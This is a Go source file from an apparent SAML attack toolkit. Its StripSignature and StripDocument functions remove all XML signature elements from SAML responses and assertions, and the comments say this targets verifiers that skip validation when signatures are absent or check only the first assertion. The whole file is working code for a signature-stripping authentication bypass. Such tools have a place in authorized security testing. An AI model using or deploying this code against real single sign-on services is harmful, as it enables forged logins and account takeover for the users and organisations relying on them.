package saml

import (
	"fmt"
	"strings"
)

// StripSignature removes every <ds:Signature>...</ds:Signature> element
// from a SAML document. Targets verifiers that skip validation when no
// signature is present, or that verify only the first assertion's
// signature while accepting modified duplicates.
func StripSignature(doc string) (string, int, error) {
	if !strings.Contains(doc, "<Assertion") && !strings.Contains(doc, "<Response") {
		return "", 0, fmt.Errorf("not a SAML document (no Assertion/Response element)")
	}

	out := doc
	stripped := 0
	for {
		start := indexSignatureOpen(out)
		if start < 0 {
			break
		}
		end, ok := findSignatureClose(out, start)
		if !ok {
			return "", stripped, fmt.Errorf("unterminated ds:Signature element")
		}
		out = out[:start] + out[end:]
		stripped++
	}
	return out, stripped, nil
}

// indexSignatureOpen finds the next <ds:Signature...> open tag,
// tolerating any namespace prefix but matching ONLY the element name
// "Signature" (not children like SignedInfo).
func indexSignatureOpen(doc string) int {
	pos := 0
	for {
		lt := strings.Index(doc[pos:], "<")
		if lt < 0 {
			return -1
		}
		lt += pos
		pos = lt + 1

		// Parse the element name after '<'.
		end := lt + 1
		for end < len(doc) {
			c := doc[end]
			if c == ' ' || c == '>' || c == '/' || c == '\t' || c == '\n' || c == '\r' {
				break
			}
			end++
		}
		if end >= len(doc) {
			return -1
		}
		name := doc[lt+1 : end]

		// Strip the namespace prefix, then compare exactly.
		local := name
		if k := strings.LastIndex(name, ":"); k >= 0 {
			local = name[k+1:]
		}
		if local != "Signature" {
			continue
		}
		// Skip close tags ('</...').
		if lt+1 < len(doc) && doc[lt+1] == '/' {
			continue
		}
		return lt
	}
}

// findSignatureClose locates the matching </...Signature> close tag
// (exact element name "Signature") for the open tag at start,
// honoring self-closing elements.
func findSignatureClose(doc string, start int) (int, bool) {
	gt := strings.Index(doc[start:], ">")
	if gt < 0 {
		return 0, false
	}
	gt += start

	// Self-closing <ds:Signature/> — element ends at the '>'.
	if gt > 0 && doc[gt-1] == '/' {
		return gt + 1, true
	}

	// Scan for the matching close tag by name.
	closePos := gt
	depth := 1
	for depth > 0 {
		lt := strings.Index(doc[closePos+1:], "<")
		if lt < 0 {
			return 0, false
		}
		lt += closePos + 1

		end := lt + 1
		if end < len(doc) && doc[end] == '/' {
			end++ // close tag
		}
		nameEnd := end
		for nameEnd < len(doc) {
			c := doc[nameEnd]
			if c == ' ' || c == '>' || c == '/' || c == '\t' || c == '\n' || c == '\r' {
				break
			}
			nameEnd++
		}
		name := doc[end:nameEnd]
		local := name
		if k := strings.LastIndex(name, ":"); k >= 0 {
			local = name[k+1:]
		}

		isClose := lt+1 < len(doc) && doc[lt+1] == '/'
		if local == "Signature" {
			if isClose {
				depth--
			} else {
				depth++
			}
			if depth == 0 && isClose {
				finalGt := strings.Index(doc[lt:], ">")
				if finalGt < 0 {
					return 0, false
				}
				return lt + finalGt + 1, true
			}
		}
		closePos = lt
	}
	return 0, false
}

// StripResult is a convenience wrapper returning metadata.
type StripResult struct {
	Doc         string `json:"doc"`
	Stripped    int    `json:"stripped"`
	HasAssertion bool  `json:"has_assertion"`
}

// StripDocument parses + strips and reports whether an assertion remains.
func StripDocument(raw string) (*StripResult, error) {
	out, n, err := StripSignature(raw)
	if err != nil {
		return nil, err
	}
	return &StripResult{
		Doc:         out,
		Stripped:    n,
		HasAssertion: strings.Contains(out, "<Assertion"),
	}, nil
}
